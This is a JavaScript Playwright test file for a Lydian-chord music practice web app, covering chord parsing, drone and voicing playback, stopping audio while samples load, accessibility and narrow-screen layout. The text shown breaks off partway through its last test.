// Browser tests: the app served under its real security headers.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { chromium } from 'playwright';
import { startServer } from './serve.mjs';

let server;
let browser;
before(async () => { server = await startServer(); browser = await chromium.launch(); });
after(async () => { await browser?.close(); await server?.close(); });

async function open(path = '/', { init, initArg } = {}) {
  const page = await browser.newPage();
  page.setDefaultTimeout(5000);
  const problems = [];
  page.on('console', (m) => { if (/Content Security Policy|Refused to/.test(m.text())) problems.push(m.text()); });
  page.on('pageerror', (e) => problems.push(String(e)));
  if (init) await page.addInitScript(init, initArg);
  await page.goto(server.url + path);
  await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0, null, { timeout: 5000 });
  return { page, problems };
}

/** Waits until a "now playing" line says Playing (the piano loads on the first press). */
async function playing(page, sel = '#now-playing') {
  await page.waitForFunction((q) => /^Playing/.test(document.querySelector(q).textContent), sel);
}

async function enterChord(page, text) {
  await page.fill('#chord-text', text);
  await page.press('#chord-text', 'Enter');
}

test('the app loads cleanly under the CSP', async () => {
  const { page, problems } = await open();
  assert.deepEqual(problems, []);
  assert.equal(await page.isVisible('#view-practice'), true);
  await page.close();
});

test('typing Dm7 shows F Lydian', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  assert.match(await page.textContent('#tonic'), /F/);
  assert.equal((await page.textContent('#parent-notes')).trim(), 'F G A B C D E');
  await page.close();
});

test('a bad chord shows a message and keeps the last good one', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await enterChord(page, 'H7');
  assert.match(await page.textContent('#chord-error'), /“H”/);
  assert.match(await page.textContent('#tonic'), /F/);
  await page.close();
});

test('flat chords stay flat', async () => {
  const { page } = await open();
  await enterChord(page, 'Gb7');
  assert.match(await page.textContent('#tonic'), /F♭/);
  await page.close();
});

test('the app works when storage is blocked', async () => {
  const { page, problems } = await open('/', {
    init: () => { Object.defineProperty(window, 'localStorage', { get() { throw new Error('blocked'); } }); },
  });
  assert.deepEqual(problems, []);
  assert.equal(await page.inputValue('#chord-text'), 'Cmaj7');
  assert.match(await page.textContent('#tonic'), /^\s*C\s*$/);
  await page.close();
});

test('a corrupt saved chord falls back to Cmaj7', async () => {
  const { page } = await open('/', { init: () => { try { localStorage.setItem('lce.chord', '"zzz"'); } catch {} } });
  assert.equal(await page.inputValue('#chord-text'), 'Cmaj7');
  await page.close();
});

test('pressing Play twice then Stop leaves silence', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await page.click('#play-scale');
  await page.click('#stop');
  await page.waitForFunction(() => document.getElementById('live').textContent === 'Stopped');
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  await page.close();
});

test('Stop pressed while the piano loads keeps it silent (scale and keyboard key)', async () => {
  const { page } = await open();
  // Hold the recordings back until after Stop, so Stop really lands mid-load.
  const held = [];
  await page.route('**/audio/piano/**', (route) => { held.push(route); });
  await page.click('#play-scale');
  await page.locator('#keyboard [role="button"][tabindex="0"]').press('Enter');
  await page.waitForFunction(() => document.getElementById('now-playing').textContent === 'Loading the piano…');
  await page.click('#stop');
  for (let i = 0; i < 50 && held.length < 25; i++) await page.waitForTimeout(50);
  assert.equal(held.length, 25, 'every recording was held back until after Stop');
  for (const r of held) await r.continue();
  await page.waitForTimeout(1500);
  const state = await page.evaluate(async () => {
    const { app } = await import('/js/main.js');
    return { playing: app.transport.isPlaying(), sound: app.engine.sound() };
  });
  assert.deepEqual(state, { playing: false, sound: 'piano' });
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  assert.doesNotMatch(await page.textContent('#now-playing'), /Playing|Loading/);
  await page.close();
});

test('the keyboard can be reached and walked with arrow keys', async () => {
  const { page } = await open();
  await page.focus('#chord-text');
  assert.equal(await page.evaluate(() => document.activeElement.id), 'chord-text');
  await page.locator('#keyboard [role="button"][tabindex="0"]').focus();
  const first = await page.evaluate(() => document.activeElement.getAttribute('aria-label'));
  await page.keyboard.press('ArrowRight');
  const second = await page.evaluate(() => document.activeElement.getAttribute('aria-label'));
  assert.notEqual(first, second);
  assert.match(second, /^[A-G]/);
  await page.close();
});

test('the gravity circle shows twelve tones in order from the tonic', async () => {
  const { page, problems } = await open('/#gravity');
  assert.equal(await page.isVisible('#view-gravity'), true);
  assert.equal(await page.locator('#gravity-circle .gnode').count(), 12);
  const first = await page.locator('#gravity-circle .gnode[data-rank="1"]').getAttribute('aria-label');
  assert.match(first, /^C\b/);
  assert.equal(await page.locator('#gravity-table tbody tr').count(), 12);
  assert.deepEqual(problems, []);
  await page.close();
});

test('arrow keys walk the gravity order and Enter explains a tone', async () => {
  const { page } = await open('/#gravity');
  await page.locator('#gravity-circle .gnode[tabindex="0"]').focus();
  await page.keyboard.press('ArrowRight');
  await page.keyboard.press('Enter');
  assert.match(await page.textContent('#gravity-note'), /rank 2 of 12/);
  await page.close();
});

test('the gravity tonic follows the Practice chord', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await page.click('#tab-gravity');
  const first = await page.locator('#gravity-circle .gnode[data-rank="1"]').getAttribute('aria-label');
  assert.match(first, /^F\b/);
  await page.close();
});

test('reference search filters the glossary as you type', async () => {
  const { page, problems } = await open('/#reference');
  const total = await page.locator('#glossary .gloss').count();
  assert.ok(total >= 15);
  await page.fill('#ref-search', 'gravity');
  const visible = page.locator('#glossary .gloss:visible');
  const count = await visible.count();
  assert.ok(count >= 1 && count < total);
  for (const text of await visible.allTextContents()) assert.match(text, /gravity/i);
  assert.match(await page.textContent('#ref-count'), /\d+/);
  await page.fill('#ref-search', '');
  assert.equal(await page.locator('#glossary .gloss:visible').count(), total);
  assert.deepEqual(problems, []);
  await page.close();
});

test('a sus chord is heard from the drone note when it is one of its Lydian tonics', async () => {
  const { page } = await open();
  await enterChord(page, 'Csus4');
  await page.waitForFunction(() => /F Lydian/.test(document.getElementById('parent-name').textContent));
  await page.selectOption('#drone-on', 'other');
  await page.selectOption('#drone-other', 'Bb');
  await page.waitForFunction(() => /B♭ Lydian/.test(document.getElementById('parent-name').textContent));
  assert.match(await page.textContent('#voicings-heard'), /B♭/);
  await page.selectOption('#drone-other', 'D');
  await page.waitForFunction(() => /^F Lydian/.test(document.getElementById('parent-name').textContent));
  await page.close();
});

test('a sus chord shows its Lydian tonics, and Hear from sets the drone (and keeps it)', async () => {
  const { page, problems } = await open();
  assert.equal(await page.isHidden('#sus-panel'), true, 'no panel for Cmaj7');
  await enterChord(page, 'Csus4');
  await page.waitForFunction(() => !document.getElementById('sus-panel').hidden);
  assert.match(await page.textContent('#sus-readings'), /no single parent scale.*Also read as: Fsus2 · G7sus4 \(no 5th\)/s);
  const buttons = page.locator('#sus-tonics button');
  assert.deepEqual(await buttons.allTextContents(), ['Hear from F', 'Hear from B♭', 'Hear from E♭', 'Hear from A♭', 'Hear from D♭']);
  assert.equal(await buttons.nth(0).getAttribute('aria-pressed'), 'true');
  assert.match(await page.textContent('#sus-ladder'), /D♭ major pentatonic/);
  await buttons.nth(1).click();
  await page.waitForFunction(() => /B♭ Lydian/.test(document.getElementById('parent-name').textContent));
  assert.equal(await page.inputValue('#drone-on'), 'other');
  assert.equal(await page.inputValue('#drone-other'), 'Bb');
  assert.equal(await page.locator('#sus-tonics button').nth(1).getAttribute('aria-pressed'), 'true');
  assert.match(await page.evaluate(() => localStorage.getItem('lce.drone')), /"note":"Bb"/);
  await enterChord(page, 'Cmaj7');
  await page.waitForFunction(() => document.getElementById('sus-panel').hidden);
  assert.equal(await page.inputValue('#drone-other'), 'Bb', 'Hear from is a lasting drone setting (David)');
  assert.deepEqual(problems, []);
  await page.close();
});

test('a sus chord on a double-sharp root renders, and survives a reload', async () => {
  const { page, problems } = await open();
  await enterChord(page, 'Exsus4');
  await page.waitForFunction(() => !document.getElementById('sus-panel').hidden);
  await page.reload();
  await page.waitForFunction(() => /E𝄪sus4/.test(document.getElementById('chord-name').textContent));
  assert.deepEqual(problems, []);
  await page.close();
});

test('a playing lead into a sus chord follows a drone change even without the held drone', async () => {
  const { page } = await open();
  await page.uncheck('#hold-tonic');
  await page.selectOption('#lead-from', 'quartal');
  await nextChord(page, 'Csus4');
  await lead(page, 'Smooth').locator('button').click();
  await playing(page);
  const target = () => page.evaluate(async () => (await import('/js/main.js')).app.transport.current()?.steps[1].slice(1));
  assert.ok((await target()).includes(59), 'heard from F Lydian first: B natural');
  await page.selectOption('#drone-on', 'other');
  await page.selectOption('#drone-other', 'Bb');
  await page.waitForTimeout(300);
  const now = await target();
  assert.ok(now.includes(58) && !now.includes(59), `the sound follows the screen (B♭ Lydian): ${now}`);
  await page.click('#stop');
  await page.close();
});

test('Hear from is announced even while another view is playing', async () => {
  const { page } = await open();
  await enterChord(page, 'Csus4');
  await page.evaluate(async () => {
    const { app } = await import('/js/main.js');
    await app.engine.resume();
    app.transport.play({ kind: 'drone', owner: 'gravity', steps: [[60]], durations: [4], loop: true, bpm: 80, label: 'Gravity test' });
  });
  await page.locator('#sus-tonics button', { hasText: 'B♭' }).click();
  await page.waitForFunction(() => /Csus4: Lydian tonic B♭/.test(document.getElementById('live').textContent), null, { timeout: 3000 });
  await page.evaluate(async () => (await import('/js/main.js')).app.transport.stop('user'));
  await page.close();
});

test('Hear from while a scale plays switches it to the new parent', async () => {
  const { page } = await open();
  await enterChord(page, 'Csus4');
  await page.click('#play-scale');
  await playing(page);
  await page.locator('#sus-tonics button', { hasText: 'E♭' }).click();
  await page.waitForFunction(() => /E♭ Lydian/.test(document.getElementById('now-playing').textContent));
  await page.click('#stop');
  await page.close();
});

test('the chord table lists verified chords and the book citation is there', async () => {
  const { page } = await open('/#reference');
  assert.ok(await page.locator('#chord-table tbody tr').count() >= 12);
  const sharp9 = page.locator('#chord-table tbody tr', { hasText: '7♯9' });
  assert.match(await sharp9.textContent(), /Auxiliary Diminished.*Lydian Diminished/s);
  assert.match(await page.textContent('#chord-table'), /Cm7b5\s*G♭ \(a tritone above the root\)/);
  assert.equal(await page.locator('#pending-list li').count(), 0);
  assert.equal(await page.isHidden('#h-pending'), true, 'nothing waits for sources, so the heading is hidden');
  const sus4 = page.locator('#chord-table tbody tr', { hasText: 'Csus4' });
  assert.match(await sus4.textContent(), /No single parent: F · B♭ · E♭ · A♭ · D♭/);
  assert.match(await sus4.textContent(), /Lydian \(no single tonic\)/);
  await page.fill('#ref-search', 'suspended');
  assert.equal(await page.locator('#chord-table tbody tr:not([hidden])').count(), 4);
  assert.match(await page.textContent('#chord-table'), /Dm7|Cm7/);
  assert.match(await page.textContent('#sources-list'), /Concept Publishing, 2001/);
  await page.close();
});

test('every view reflows to a 320 px screen without sideways scrolling', async () => {
  const page = await browser.newPage({ viewport: { width: 320, height: 800 } });
  for (const hash of ['', '#gravity', '#reference']) {
    await page.goto(`${server.url}/${hash}`);
    await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0);
    assert.equal(await page.evaluate(() => document.documentElement.scrollWidth), 320, hash || '#practice');
  }
  await page.close();
});

test('scale cards have a short name and a description', async () => {
  const { page } = await open();
  const card = page.locator('.ladder-card').first();
  const name = await card.evaluate((el) => el.getAttribute('aria-labelledby').split(' ').map((id) => document.getElementById(id).textContent).join(' '));
  assert.match(name, /^1 C Lydian$/);
  const desc = await card.evaluate((el) => el.getAttribute('aria-describedby').split(' ').map((id) => document.getElementById(id).textContent).join(' '));
  assert.match(desc, /C D E F♯ G A B/);
  assert.equal(await page.locator('#tonic[aria-label]').count(), 0);
  await page.close();
});

test('stopping a note before it sounds does not blip', async () => {
  const { page } = await open();
  const peaks = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    async function peak(stopEarly) {
      class Offline extends OfflineAudioContext {
        constructor() { super(1, 44100, 44100); }
        get state() { return 'running'; }
      }
      const engine = createEngine({ AudioContextCtor: Offline, volume: 1 });
      await engine.resume();
      engine.note(60, 0.1, 0.5);
      if (stopEarly) engine.stopAll();
      const ctx = engine.context();
      const data = (await ctx.startRendering()).getChannelData(0);
      return data.reduce((m, v) => Math.max(m, Math.abs(v)), 0);
    }
    return { normal: await peak(false), stopped: await peak(true) };
  });
  assert.ok(peaks.stopped <= peaks.normal + 0.01, JSON.stringify(peaks));
  await page.close();
});

test('the skip link does not change the view', async () => {
  const { page } = await open('/#gravity');
  await page.keyboard.press('Tab');
  assert.equal(await page.evaluate(() => document.activeElement.id), 'skip');
  await page.keyboard.press('Enter');
  await page.waitForTimeout(100);
  assert.equal(await page.isVisible('#view-gravity'), true);
  await page.close();
});

test('playing state stays true across views', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await page.click('#tab-gravity');
  await page.locator('#gravity-circle .gnode[data-rank="3"]').click();
  // The first press loads the piano, so wait for the drone to start.
  await playing(page, '#gravity-status');
  assert.match(await page.textContent('#gravity-status'), /Drone on C/);
  await page.click('#tab-practice');
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  assert.equal(await page.getAttribute('#drone', 'aria-pressed'), 'true');
  assert.match(await page.textContent('#now-playing'), /Drone on C/);
  await page.click('#stop');
  assert.match(await page.textContent('#gravity-status'), /Silent/);
  await page.close();
});

test('a new chord is announced to screen readers', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await page.waitForFunction(() => /Lydian tonic F\b/.test(document.getElementById('live').textContent));
  await page.close();
});

test('changing the chord type keeps the typed root spelling', async () => {
  const { page } = await open();
  await enterChord(page, 'C#m7');
  await page.selectOption('#chord-quality', 'maj7');
  assert.equal(await page.inputValue('#chord-text'), 'C#maj7');
  await page.close();
});

test('no key flashes after Stop', async () => {
  const { page } = await open();
  await page.$eval('#bpm', (el) => { el.value = '200'; el.dispatchEvent(new Event('input')); });
  await page.click('#play-scale');
  await playing(page);
  await page.waitForTimeout(500);
  await page.click('#stop');
  await page.waitForTimeout(150);
  assert.equal(await page.locator('#keyboard .is-sounding').count(), 0);
  await page.close();
});

test('scale runs play in octave 3, inside the on-screen keyboard (C3–B4)', async () => {
  const { page } = await open();
  for (const chord of ['Cmaj7', 'Bm7']) {
    await enterChord(page, chord);
    await page.click('#play-scale');
    await playing(page);
    const notes = await page.evaluate(async () => {
      const { app } = await import('/js/main.js');
      return app.transport.current().steps.flat();
    });
    assert.ok(notes[0] >= 48 && notes[0] < 60, `${chord} starts in octave 3: ${notes[0]}`);
    assert.ok(notes.every((m) => m >= 48 && m <= 71), `${chord} stays on the keyboard: ${notes}`);
    await page.click('#stop');
  }
  await page.close();
});

test('Drone sound: organ by default, four choices, and the drone says which', async () => {
  const { page } = await open();
  assert.equal(await page.inputValue('#drone-sound'), 'organ');
  const labels = await page.$$eval('#drone-sound option', (os) => os.map((o) => o.textContent));
  assert.deepEqual(labels, ['Organ', 'Synth pad', 'Upright bass', 'Piano']);
  await page.click('#drone');
  await playing(page);
  assert.match(await page.textContent('#now-playing'), /Drone on C, the bass note, organ/);
  await page.click('#stop');
  await page.close();
});

test('changing the drone sound mid-drone switches cleanly, leaving no organ ringing', async () => {
  const { page } = await open();
  await page.click('#drone');
  await playing(page);
  await page.selectOption('#drone-sound', 'pad');
  await page.waitForFunction(() => /synth pad/.test(document.getElementById('now-playing').textContent));
  await page.waitForTimeout(600); // the organ's release has finished
  const state = await page.evaluate(async () => {
    const { app } = await import('/js/main.js');
    return { sound: app.transport.current()?.droneSound, voices: app.engine.voiceCount() };
  });
  assert.deepEqual(state, { sound: 'pad', voices: 2 }, 'just the pad: root and fifth');
  await page.click('#stop');
  await page.close();
});

test('the scale run and Gravity use the chosen drone sound, and the choice is remembered', async () => {
  const { page } = await open();
  await page.selectOption('#drone-sound', 'pad');
  await page.click('#play-scale');
  await playing(page);
  const scaleSound = await page.evaluate(async () => (await import('/js/main.js')).app.transport.current().droneSound);
  assert.equal(scaleSound, 'pad');
  await page.click('#tab-gravity');
  await page.locator('#gravity-circle .gnode[data-rank="3"]').click();
  await page.waitForFunction(() => /Drone on C/.test(document.getElementById('gravity-status').textContent));
  const gravitySound = await page.evaluate(async () => (await import('/js/main.js')).app.transport.current().droneSound);
  assert.equal(gravitySound, 'pad');
  await page.click('#gravity-stop');
  await page.reload();
  await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0);
  assert.equal(await page.inputValue('#drone-sound'), 'pad');
  await page.close();
});

test('choosing the upright bass loads its 14 recordings from this site, on the first drone', async () => {
  const { page, problems } = await open();
  const bass = [];
  page.on('request', (r) => { if (r.url().includes('/audio/bass/')) bass.push(r.url()); });
  await page.selectOption('#drone-sound', 'bass');
  assert.equal(bass.length, 0, 'nothing loads until a drone plays');
  await page.click('#drone');
  await playing(page);
  assert.equal(bass.length, 14);
  assert.ok(bass.every((u) => u.startsWith(server.url)));
  assert.match(await page.textContent('#now-playing'), /upright bass/);
  assert.deepEqual(problems, []);
  await page.click('#stop');
  await page.close();
});

test('while the bass loads, the screen says so', async () => {
  const { page } = await open();
  await page.click('#drone');
  await playing(page);
  await page.click('#stop');
  const held = [];
  await page.route('**/audio/bass/**', (route) => { held.push(route); });
  await page.selectOption('#drone-sound', 'bass');
  await page.click('#drone');
  await page.waitForFunction(() => document.getElementById('now-playing').textContent === 'Loading the upright bass…');
  for (let i = 0; i < 50 && held.length < 14; i++) await page.waitForTimeout(50);
  for (const r of held) await r.continue();
  await playing(page);
  assert.match(await page.textContent('#now-playing'), /upright bass/);
  await page.click('#stop');
  await page.close();
});

test('if the bass cannot load, the drone plays a held organ and says so in its label', async () => {
  const { page } = await open();
  await page.route('**/audio/bass/**', (route) => route.fulfill({ status: 404, body: '' }));
  await page.selectOption('#drone-sound', 'bass');
  await page.click('#drone');
  await playing(page);
  assert.match(await page.textContent('#now-playing'), /organ \(the upright bass didn’t load\)/);
  const state = await page.evaluate(async () => {
    const { app } = await import('/js/main.js');
    return { sound: app.transport.current().droneSound, notes: app.transport.current().steps[0] };
  });
  assert.equal(state.sound, 'organ');
  assert.equal(state.notes.length, 2, 'root and fifth, held like the organ');
  await page.waitForFunction(() => /upright bass didn’t load/.test(document.getElementById('live').textContent));
  await page.click('#stop');
  await page.close();
});

test('Stop pressed while the bass recordings load keeps it silent', async () => {
  const { page } = await open();
  await page.click('#drone'); // the piano and organ path loads first
  await playing(page);
  await page.click('#stop');
  const held = [];
  await page.route('**/audio/bass/**', (route) => { held.push(route); });
  await page.selectOption('#drone-sound', 'bass');
  await page.click('#drone');
  for (let i = 0; i < 50 && held.length < 14; i++) await page.waitForTimeout(50);
  await page.click('#stop');
  for (const r of held) await r.continue();
  await page.waitForTimeout(1000);
  const playingNow = await page.evaluate(async () => (await import('/js/main.js')).app.transport.isPlaying());
  assert.equal(playingNow, false);
  assert.doesNotMatch(await page.textContent('#now-playing'), /Playing/);
  await page.close();
});

const now = (page) => page.evaluate(async () => {
  const { app } = await import('/js/main.js');
  const p = app.transport.current();
  return p && { kind: p.kind, voicingId: p.voicingId, voicingIds: p.voicingIds, label: p.label };
});
const row = (page, name) => page.locator('#voicings li', { has: page.locator('.voicing-name', { hasText: new RegExp(`^${name}$`) }) });

test('Voicings card: each sourced voicing of the chord, its notes, and the centre it is heard from', async () => {
  const { page, problems } = await open();
  assert.equal(await page.textContent('#h-voicings'), 'Voicings of Cmaj7');
  assert.equal(await page.locator('#voicings li').count(), 9);
  assert.match(await row(page, 'Close').textContent(), /B C E G over C/);
  assert.match(await row(page, 'Spread').textContent(), /C B E A D over C/);
  assert.match(await page.textContent('#voicings-heard'), /heard from C.*C Lydian/);
  assert.notEqual(await page.getAttribute('#voicings-pending', 'hidden'), null, 'nothing waits for sources, so the line is hidden');
  await enterChord(page, 'Dm7/G');
  assert.match(await page.textContent('#voicings-heard'), /heard from G.*G Mixolydian/);
  assert.deepEqual(problems, []);
  await page.close();
});

test('a voicing plays and stops from the same button; another switches to it', async () => {
  const { page } = await open();
  const drop2 = row(page, 'Drop 2').locator('button');
  await drop2.click();
  await playing(page);
  assert.deepEqual(await now(page), { kind: 'voicing', voicingId: 'drop2', voicingIds: undefined, label: 'Drop 2 of Cmaj7' });
  assert.equal(await drop2.getAttribute('aria-pressed'), 'true');
  // A toggle keeps its name; its state is aria-pressed (and the row's aria-current).
  assert.equal(await drop2.getAttribute('aria-label'), 'Play drop 2');
  assert.match(await drop2.textContent(), /Play/);
  assert.equal(await row(page, 'Drop 2').getAttribute('aria-current'), 'true');
  await row(page, 'Close').locator('button').click();
  await page.waitForFunction(() => /Close of Cmaj7/.test(document.getElementById('now-playing').textContent));
  assert.equal(await drop2.getAttribute('aria-pressed'), 'false');
  assert.equal(await row(page, 'Close').locator('button').getAttribute('aria-pressed'), 'true');
  await row(page, 'Close').locator('button').click();
  await page.waitForFunction(async () => !(await import('/js/main.js')).app.transport.isPlaying());
  await page.close();
});

test('changing the chord while a voicing plays keeps the same voicing on the new chord', async () => {
  const { page } = await open();
  await row(page, 'Drop 2').locator('button').click();
  await playing(page);
  await enterChord(page, 'G7');
  await page.waitForFunction(() => /Drop 2 of G7/.test(document.getElementById('now-playing').textContent));
  assert.equal((await now(page)).voicingId, 'drop2');
  await page.click('#stop');
  await page.close();
});

test('if the playing voicing does not fit the new chord, Close plays and the chord is announced', async () => {
  const { page } = await open();
  await row(page, 'Rootless A').locator('button').click();
  await playing(page);
  await enterChord(page, 'C6');
  await page.waitForFunction(() => /Close of C6/.test(document.getElementById('now-playing').textContent));
  await page.waitForFunction(() => /C6: Lydian tonic/.test(document.getElementById('live').textContent));
  await page.click('#stop');
  await page.close();
});

test('with the drone held, changing the drone note restarts the voicing over the new drone', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7/G');
  assert.equal(await page.isChecked('#hold-tonic'), true);
  await row(page, 'Close').locator('button').click();
  await playing(page);
  const before = await page.evaluate(async () => (await import('/js/main.js')).app.transport.current().drone);
  await page.selectOption('#drone-on', 'root');
  await page.waitForFunction(async (b) => {
    const p = (await import('/js/main.js')).app.transport.current();
    return p && JSON.stringify(p.drone) !== JSON.stringify(b);
  }, before);
  const after = await page.evaluate(async () => (await import('/js/main.js')).app.transport.current());
  assert.equal(after.voicingId, 'close');
  assert.equal(after.drone[0] % 12, 2, 'the drone is now on D');
  await page.click('#stop');
  await page.close();
});

test('changing the drone note updates the readings without restarting the voicing', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7/G');
  await page.uncheck('#hold-tonic');
  await row(page, 'Close').locator('button').click();
  await playing(page);
  await page.evaluate(async () => { window.__p = (await import('/js/main.js')).app.transport.current(); });
  await page.selectOption('#drone-on', 'root');
  assert.match(await page.textContent('#voicings-heard'), /heard from D/);
  assert.equal(await page.evaluate(async () => (await import('/js/main.js')).app.transport.current() === window.__p), true);
  await page.click('#stop');
  await page.close();
});

test('a voicing that does not fit the chord says so and is skipped by Play all', async () => {
  const { page } = await open();
  await enterChord(page, 'Caug');
  assert.match(await row(page, 'Rootless A').textContent(), /Not for this chord/);
  assert.equal(await row(page, 'Rootless A').locator('button').count(), 0);
  await page.click('#voicings-all');
  await playing(page);
  const p = await now(page);
  assert.equal(p.kind, 'voicings');
  assert.ok(!p.voicingIds.includes('rootlessA') && p.voicingIds.includes('close'), JSON.stringify(p));
  assert.equal(await page.getAttribute('#voicings-all', 'aria-pressed'), 'true');
  assert.match(await page.textContent('#voicings-all'), /Play all/);
  await page.waitForFunction(() => /^Now: Close\.$/.test(document.getElementById('voicings-now').textContent));
  await page.click('#voicings-all');
  await page.waitForFunction(async () => !(await import('/js/main.js')).app.transport.isPlaying());
  assert.equal(await page.getAttribute('#voicings-all', 'aria-pressed'), 'false');
  assert.equal(await page.textContent('#voicings-now'), '');
  await page.close();
});

test('the Voicings card fits a 320 px screen', async () => {
  const page = await browser.newPage({ viewport: { width: 320, height: 800 } });
  await page.goto(server.url + '/');
  await page.waitForFunction(() => document.querySelectorAll('#voicings li').length > 0);
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth), 320);
  await page.close();
});

async function nextChord(page, text) {
  await page.fill('#next-chord', text);
  await page.press('#next-chord', 'Enter');
}
const lead = (page, name) => page.locator('#leads li', { has: page.locator('.lead-name', { hasText: new RegExp(`^${name}$`) }) });

test('Next chord: empty shows a hint; same shape planes D-7 to E♭-7 in parallel', async () => {
  const { page, problems } = await open();
  assert.equal(await page.locator('#leads li').count(), 0);
  assert.match(await page.textContent('#lead-hint'), /next chord/i);
  await enterChord(page, 'Dm7');
  await page.selectOption('#lead-from', 'drop2');
  await nextChord(page, 'Ebm7');
  const same = lead(page, 'Same shape');
  assert.match(await same.textContent(), /moves in parallel/);
  assert.equal((await same.locator('.lead-steps').textContent()).match(/↑1/g).length, 4);
  assert.deepEqual(problems, []);
  await page.close();
});

test('Next chord: each chord heard from its own drone note, described not prescribed', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7/G');
  await nextChord(page, 'Ebm7/Ab');
  assert.match(await page.textContent('#lead-centres'), /G.*A♭/);
  const smooth = await lead(page, 'Smooth').textContent();
  assert.doesNotMatch(smooth, /must|should|resolve/i);
  assert.match(smooth, /rank \d+ → \d+/);
  await page.close();
});

test('Next chord: a chord the app does not know shows the reason and no rows', async () => {
  const { page } = await open();
  for (const text of ['C7sus9', 'zz']) {
    await nextChord(page, text);
    assert.match(await page.textContent('#next-chord-error'), /\w/);
    assert.equal(await page.getAttribute('#next-chord', 'aria-invalid'), 'true');
    assert.equal(await page.locator('#leads li').count(), 0);
  }
  await nextChord(page, 'G7');
  assert.equal(await page.getAttribute('#next-chord', 'aria-invalid'), null);
  await page.close();
});

test('Next chord: same shape onto the same chord says nothing moves', async () => {
  const { page } = await open();
  await nextChord(page, 'Cmaj7');
  const same = await lead(page, 'Same shape').textContent();
  assert.match(same, /Same chord: nothing moves\./);
  assert.doesNotMatch(same, /moves in parallel/);
  await page.close();
});

test('a MIDI chord change keeps focus without scrolling the page', async () => {
  const page = await browser.newPage({ viewport: { width: 390, height: 700 } });
  await page.goto(server.url + '/');
  await page.waitForFunction(() => document.querySelectorAll('#voicings li').length > 0);
  await row(page, 'Drop 2').locator('button').focus();
  await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
  const before = await page.evaluate(() => window.scrollY);
  await page.evaluate(async () => {
    const { app } = await import('/js/main.js');
    const { parseChord } = await import('/js/theory/chords.js');
    app.practice.setChord(parseChord('Dm7'), 'midi');
  });
  await page.waitForFunction(() => document.getElementById('h-voicings').textContent === 'Voicings of Dm7');
  // Content above may change height (the browser's scroll anchoring keeps the view steady);
  // what mustn't happen is the page being pulled up to the focused button.
  const after = await page.evaluate(() => window.scrollY);
  assert.ok(after >= before - 50, `the page isn't pulled back to the Voicings card: ${before} → ${after}`);
  assert.ok(!(await row(page, 'Drop 2').locator('button').isVisible()) || (await page.evaluate(() => { const r = document.activeElement.getBoundingClientRect(); return r.bottom < 0 || r.top > innerHeight; })), 'the focused button stays out of view');
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Play drop 2');
  await page.close();
});

test('Next chord: same shape onto an inversion says the bass moves', async () => {
  const { page } = await open();
  await nextChord(page, 'Cmaj7/E');
  const same = await lead(page, 'Same shape').textContent();
  assert.doesNotMatch(same, /nothing moves/);
  assert.match(same, /The upper voices stay put; the bass moves to E\./);
  await page.close();
});

test('a chord change keeps focus on the same voicing’s button', async () => {
  const { page } = await open();
  await row(page, 'Drop 2').locator('button').focus();
  await page.evaluate(() => { const t = document.getElementById('chord-text'); t.value = 'Dm7'; t.dispatchEvent(new Event('input')); });
  await page.waitForFunction(() => document.getElementById('h-voicings').textContent === 'Voicings of Dm7');
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Play drop 2');
  await nextChord(page, 'G7');
  await lead(page, 'Same shape').locator('button').focus();
  await page.evaluate(() => { const t = document.getElementById('chord-text'); t.value = 'Em7'; t.dispatchEvent(new Event('input')); });
  await page.waitForFunction(() => document.getElementById('h-voicings').textContent === 'Voicings of Em7');
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Play same shape lead');
  await page.close();
});

test('Next chord: same shape that does not fit says so', async () => {
  const { page } = await open();
  await page.selectOption('#lead-from', 'rootlessA');
  await nextChord(page, 'Caug');
  const same = lead(page, 'Same shape');
  assert.match(await same.textContent(), /Not for this chord/);
  assert.equal(await same.locator('button').count(), 0);
  await page.close();
});

test('Next chord: Play toggles the lead, and a new next chord restarts it', async () => {
  const { page } = await open();
  await nextChord(page, 'Dm7');
  const btn = lead(page, 'Smooth').locator('button');
  await btn.click();
  await playing(page);
  let p = await page.evaluate(async () => { const c = (await import('/js/main.js')).app.transport.current(); return { kind: c.kind, way: c.way, label: c.label }; });
  assert.deepEqual([p.kind, p.way], ['lead', 'smooth']);
  assert.equal(await btn.getAttribute('aria-pressed'), 'true');
  assert.equal(await btn.getAttribute('aria-label'), 'Play smooth lead');
  assert.equal(await lead(page, 'Smooth').getAttribute('aria-current'), 'true');
  assert.equal(await lead(page, 'Same shape').getAttribute('aria-current'), null);
  await nextChord(page, 'G7');
  await page.waitForFunction(() => /→ G7/.test(document.getElementById('now-playing').textContent));
  await lead(page, 'Smooth').locator('button').click();
  await page.waitForFunction(async () => !(await import('/js/main.js')).app.transport.isPlaying());
  await page.close();
});

test('Next chord: clearing or mistyping the next chord stops a playing lead', async () => {
  const { page } = await open();
  for (const text of ['', 'zz']) {
    await nextChord(page, 'G7');
    await lead(page, 'Smooth').locator('button').click();
    await playing(page);
    await nextChord(page, text);
    await page.waitForFunction(async () => !(await import('/js/main.js')).app.transport.isPlaying());
    assert.equal(await page.locator('#leads li').count(), 0);
  }
  await page.close();
});

test('Next chord: a held organ drone follows each chord and leaves nothing ringing after Stop', async () => {
  const { page } = await open();
  await page.selectOption('#drone-sound', 'organ');
